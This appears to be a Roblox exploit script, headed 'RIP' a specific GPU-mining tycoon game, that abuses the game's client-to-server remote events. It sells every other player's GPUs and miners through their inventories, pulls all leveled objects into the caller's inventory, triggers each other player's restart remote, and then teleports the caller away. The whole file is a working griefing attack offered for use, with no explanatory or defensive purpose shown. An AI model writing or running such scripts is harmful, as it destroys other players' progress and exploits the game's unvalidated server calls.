-- RIP https://www.roblox.com/games/7392774291/GPU-Mining-Tycoon-NEW
-- by Nameless9000

for _,plr in pairs(game.Players:GetChildren()) do
    if plr == game.Players.LocalPlayer then continue end
    for _,gpu in pairs(plr.ValueSave.invgpus:GetChildren()) do
        local ohInstance1 =gpu
        local ohString2 = "Gpus"
        
        game:GetService("Players").LocalPlayer.Backpack.sell1:FireServer(ohInstance1, ohString2)
    end

    for _,miner in pairs(plr.ValueSave.invgpus:GetChildren()) do
        local ohInstance1 =miner
        local ohString2 = "Machine"
        
        game:GetService("Players").LocalPlayer.Backpack.sell1:FireServer(ohInstance1, ohString2)
    end
end

for _,v in pairs(game:GetDescendants()) do
    if not v:FindFirstChild("lvl") then continue end
    
    local ohInstance1 = v
    local ohString2 = "toinventory"
    
    game:GetService("Players").LocalPlayer.Backpack.activar3:FireServer(ohInstance1, ohString2)
end

for _,plr in pairs(game.Players:GetChildren()) do
    if plr == game.Players.LocalPlayer then continue end
    plr.Backpack.restart1:FireServer()
end

game:GetService('TeleportService'):Teleport(game.PlaceId)
